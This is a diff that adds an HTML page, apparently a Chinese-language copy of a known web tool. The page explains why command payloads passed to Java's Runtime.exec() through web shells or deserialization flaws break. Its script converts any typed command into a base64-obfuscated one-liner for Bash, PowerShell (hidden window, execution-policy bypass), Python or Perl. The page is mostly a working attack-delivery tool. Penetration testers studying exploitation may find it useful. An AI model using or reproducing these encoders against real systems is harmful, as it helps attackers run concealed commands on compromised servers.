@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head> 
+  <title>java.lang.Runtime.exec() Payload Workarounds - @Jackson_T</title> 
+  <meta charset="utf-8" /> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
+  <!-- <link rel="stylesheet" href="./css/main.css" type="text/css" /> --> 
+  <style>
+body {
+	margin: 0;
+	padding: 10px 0;
+	text-align: center;
+	font-family: 'Ubuntu Condensed', sans-serif;
+	color: #585858;
+  background-color: #fff;
+	font-size: 13px;
+	line-height: 1.4
+}			
+::selection {
+	background: #fff2a8;
+}
+pre, code {
+	font-family: 'Ubuntu Mono', 'Consolas', Monospace;
+  font-size: 13px;
+  background-color: #E5F5E5;
+  color: #585858;
+  padding-left: 0.25em;
+  padding-right: 0.25em;
+	/*display: block;*/
+}		
+#wrap {
+	margin-left: 1em;
+	margin-right: 1em;
+	text-align: left;
+	font-size: 13px;
+	line-height: 1.4
+}
+	#wrap {
+		width: 820px;
+	}
+	#container {
+		float: right;
+		width: 610px;
+	}
+.entry {
+	font-size: 14px;
+	line-height: 20px;
+	hyphens: auto;
+	font-family: 'Roboto', sans-serif, 'Inconsolata', Monospace;
+}
+</style> 
+ </head> 
+ <body> 
+  <div id="wrap"> 
+   <div id="container"> 
+    <div class="entry"> 
+     <article> 
+      <p>偶尔有时命令执行有效负载<code>Runtime.getRuntime().exec()</code>失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.</p> 
+      <p>有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 <code>ls &gt; dir_listing</code> 在shell中执行应该将当前目录的列表输出到名为的文件中 <code>dir_listing</code>. 但是在 <code>exec()</code> 函数的上下文中,该命令将被解释为获取 <code>&gt;</code> 和 <code>dir_listing</code> 目录.</p> 
+      <p>其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 <code>ls &quot;My Directory&quot;</code> 会被解释为 <code>ls '&quot;My' 'Directory&quot;'</code>.</p> 
+      <p>在Base64编码的帮助下, 下面的转换器可以帮助减少这些问题. 它可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.</p> 
+      <p>Input type: <input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked="" /><label for="bash">Bash</label> <input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();" /><label for="powershell">PowerShell</label> <input type="radio" id="python" name="option" value="python" onclick="processInput();" /><label for="python">Python</label> <input type="radio" id="perl" name="option" value="perl" onclick="processInput();" /><label for="perl">Perl</label></p> 
+      <p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="Type input here..."></textarea> <textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly=""></textarea></p> 
+      <script>
+  var taInput = document.querySelector('textarea#input');
+  var taOutput = document.querySelector('textarea#output');
+
+  function processInput() {
+    var option = document.querySelector('input[name="option"]:checked').value;
+
+    switch (option) {
+      case 'bash':
+        taInput.placeholder = 'Type Bash here...'
+        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
+        break;
+      case 'powershell':
+        taInput.placeholder = 'Type PowerShell here...'
+        poshInput = ''
+        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
+        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
+        break;
+      case 'python':
+        taInput.placeholder = 'Type Python here...'
+        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
+        break;
+      case 'perl':
+        taInput.placeholder = 'Type Perl here...'
+        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
+        break;
+      default:
+        taOutput.value = ''
+    }
+
+    if (!taInput.value) taOutput.value = '';
+  }
+
+  taInput.addEventListener('input', processInput, false);
+</script> 
+     </article> 
+    </div> 
+   </div> 
+  </div>  
+ </body>
+</html>
